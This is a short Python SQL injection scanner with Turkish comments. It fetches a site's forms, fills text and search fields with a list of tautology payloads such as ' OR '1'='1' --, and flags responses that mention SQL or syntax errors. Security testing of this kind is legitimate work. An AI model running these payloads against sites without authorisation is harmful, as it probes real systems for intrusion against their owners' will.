import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from colorama import Fore, Style

# SQL Injection tespiti için kullanılacak temel saldırı yükleri
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' ({",
    "' OR '1'='1' /*",
    "' OR '1'='1' %00",
    "' OR '1'='1' %#",
    "' OR '1'='1' -",
    "' OR '1'='1' %",
    "' OR '1'='1' ^",
    "' OR '1'='1' @"
]

def scan_sql_injection(url, payloads):
    vulnerable = False
    print(f"{Fore.YELLOW}Tarama başlıyor: {url}{Style.RESET_ALL}")
    for payload in payloads:
        full_url = f"{url}{payload}"
        response = requests.get(full_url)
        if "sql" in response.text.lower() or "syntax" in response.text.lower():
            print(f"{Fore.RED}[!] Potansiyel SQL Injection Bulundu: {full_url}{Style.RESET_ALL}")
            vulnerable = True
            break
    if not vulnerable:
        print(f"{Fore.GREEN}[+] Güvenli: {url}{Style.RESET_ALL}")

def get_all_forms(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    return soup.find_all('form')

def get_form_details(form):
    details = {}
    action = form.attrs.get('action').lower()
    method = form.attrs.get('method', 'get').lower()
    inputs = []
    for input_tag in form.find_all('input'):
        input_type = input_tag.attrs.get('type', 'text')
        input_name = input_tag.attrs.get('name')
        inputs.append({'type': input_type, 'name': input_name})
    details['action'] = action
    details['method'] = method
    details['inputs'] = inputs
    return details

def scan_site(url, payloads):
    forms = get_all_forms(url)
    print(f"{Fore.BLUE}Toplam {len(forms)} form bulundu.{Style.RESET_ALL}")
    for form in forms:
        form_details = get_form_details(form)
        form_action = form_details['action']
        if form_action:
            form_url = urljoin(url, form_action)
        else:
            form_url = url
        print(f"{Fore.YELLOW}Form taranıyor: {form_url}{Style.RESET_ALL}")
        for payload in payloads:
            data = {}
            for input_tag in form_details['inputs']:
                if input_tag['type'] == 'text' or input_tag['type'] == 'search':
                    data[input_tag['name']] = payload
                elif input_tag['type'] == 'hidden':
                    data[input_tag['name']] = input_tag.get('value', '')
            if form_details['method'] == 'post':
                response = requests.post(form_url, data=data)
            else:
                response = requests.get(form_url, params=data)
            if "sql" in response.text.lower() or "syntax" in response.text.lower():
                print(f"{Fore.RED}[!] Potansiyel SQL Injection Bulundu: {form_url}{Style.RESET_ALL}")
                break

def main():
    url = input("Lütfen taranacak web sitesini girin (örn: http://example.com): ")
    scan_site(url, payloads)

if __name__ == "__main__":
    main()
